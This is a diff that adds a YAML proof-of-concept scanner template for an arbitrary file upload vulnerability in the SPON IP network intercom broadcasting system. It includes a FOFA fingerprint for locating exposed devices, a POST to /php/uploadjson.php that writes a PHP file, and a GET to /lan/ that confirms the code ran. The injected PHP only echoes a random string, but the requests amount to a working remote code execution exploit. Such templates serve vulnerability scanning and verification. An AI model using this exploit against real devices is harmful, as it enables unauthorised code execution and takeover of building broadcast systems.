@@ -1,0 +1,32 @@
+id: poc-yaml-spon-ip-internet-intercom-broadcasting-system-uploadjson-php-anyfile-upload
+info:
+  name: 世邦通信 SPON IP网络对讲广播系统uploadjson.php任意文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: SPON IP网络对讲广播系统
+  fofa: icon_hash="-1830859634"
+variables:
+  filename: random_str(6)
+  content: random_str(32)
+requests:
+- method: POST
+  path: /php/uploadjson.php
+  headers:
+    Content-Type: application/x-www-form-urlencoded;charset=UTF-8
+  data: jsondata[filename]={{.filename}}.php&jsondata[data]=<?php echo '{{.content}}';?>
+  expression: 'status_code == 200 &&
+
+    contains(body,"{\"res\":\"1\"}") &&
+
+    contains(headers,"text/html")
+
+    '
+- method: GET
+  path: /lan/{{.filename}}.php
+  expression: 'status_code == 200 &&
+
+    contains(body,content)
+
+    '
+transport: http
